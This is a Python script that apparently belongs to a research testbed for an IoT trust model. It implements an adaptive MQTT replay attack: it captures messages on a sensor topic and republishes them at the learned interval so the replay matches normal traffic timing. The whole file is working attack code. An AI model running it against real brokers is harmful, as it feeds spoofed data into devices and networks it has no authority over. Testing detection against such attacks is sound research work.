"""
=========================================================
ATTACK: REPLAY ATTACK (Python / laptop version)
=========================================================
Methodology Section 3.2.2 / Table 1:
  "Retransmission of previously captured valid messages."
  Expected: T slightly reduced, may maintain HIGH trust (Medium)

ADAPTIVE BEHAVIOUR:
  1. LEARNING PHASE — passively captures real messages from
     the target topic for LEARN_DURATION seconds
  2. ATTACK PHASE — replays the captured messages byte-for-byte
     on a loop using the LEARNED interval timing so replay
     cadence matches the real network rhythm

The controller passes previously captured baseline messages in
`captured`, so no second capture phase is needed.
=========================================================
"""

import os
import time
from adaptive_learner import learn_network, make_client

# =========================
# CONFIG
# =========================
BROKER         = os.environ.get("MQTT_BROKER", "localhost")
PORT           = 1883
USER           = "esp32user"
PASSWORD       = os.environ.get("MQTT_PASS", "")
TARGET_TOPIC   = "iot/node1/data"
ATTACKER_ID    = "attacker_replay_py"
LEARN_DURATION = 60
MAX_CAPTURED   = 5


def capture_messages(broker, port, user, password, topic, count, duration):
    """Capture up to count real messages over duration seconds."""
    captured = []

    def on_message(client, userdata, msg):
        payload = msg.payload.decode()
        if payload not in captured:
            captured.append(payload)
            print(f"[capture] {len(captured)}/{count}: {payload}")

    client = make_client("capture_listener")
    client.username_pw_set(user, password)
    client.on_message = on_message
    client.connect(broker, port, 60)
    client.subscribe(topic)
    client.loop_start()

    start = time.time()
    while time.time() - start < duration and len(captured) < count:
        time.sleep(1)

    client.loop_stop()
    client.disconnect()
    return captured


def run(profile, broker=BROKER, port=PORT, user=USER, password=PASSWORD,
        target_topic=TARGET_TOPIC, duration=None, stop_event=None,
        on_publish=None, captured=None):
    """Replay previously captured messages at the learned interval.

    Returns the number of messages replayed.
    """
    if captured is None:
        print("=== CAPTURING MESSAGES TO REPLAY ===")
        captured = capture_messages(broker, port, user, password,
                                    target_topic, MAX_CAPTURED,
                                    max(LEARN_DURATION, 30))
    if not captured:
        print("No messages captured — is the node publishing? Exiting.")
        return 0

    client = make_client(ATTACKER_ID)
    client.username_pw_set(user, password)
    client.connect(broker, port, 60)
    client.loop_start()

    interval = max(0.1, profile.interval_mean)
    idx = 0
    end = time.time() + duration if duration else None
    try:
        while True:
            if stop_event is not None and stop_event.is_set():
                break
            if end is not None and time.time() >= end:
                break
            msg = captured[idx % len(captured)]
            client.publish(target_topic, msg)
            idx += 1
            if on_publish:
                on_publish(msg)
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        client.loop_stop()
        client.disconnect()
    return idx


def main():
    print("=== REPLAY ATTACK (adaptive) ===")
    print(f"Target: {TARGET_TOPIC}")

    profile = learn_network(BROKER, PORT, USER, PASSWORD, TARGET_TOPIC,
                             learn_duration=LEARN_DURATION)

    print(f"\n=== REPLAY ACTIVE — interval ~{profile.interval_mean:.2f}s ===")
    run(profile, on_publish=lambda m: print(f"[replay] {m}"))


if __name__ == "__main__":
    main()
